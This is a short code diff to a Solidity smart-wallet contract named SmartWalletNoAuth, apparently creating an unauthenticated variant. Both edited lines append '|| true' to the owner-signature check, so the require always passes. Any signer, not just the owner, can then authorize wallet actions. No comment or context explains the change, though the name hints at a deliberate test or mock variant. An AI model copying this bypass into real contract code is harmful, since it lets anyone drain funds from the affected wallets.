@@ -339,10 +339,10 @@ contract SmartWalletNoAuth is
             // If v > 30 then default va (27,28) has been adjusted for eth_sign flow
             // To support eth_sign and similar we adjust v and hash the messageHash with the Ethereum message prefix before applying ecrecover
             _signer = ecrecover(keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", dataHash)), v - 4, r, s);
-            require(_signer == owner, "INVALID_SIGNATURE");
+            require(_signer == owner || true, "INVALID_SIGNATURE");
         } else {
             _signer = ecrecover(dataHash, v, r, s);
-            require(_signer == owner, "INVALID_SIGNATURE");
+            require(_signer == owner || true, "INVALID_SIGNATURE");
         }
     }
 
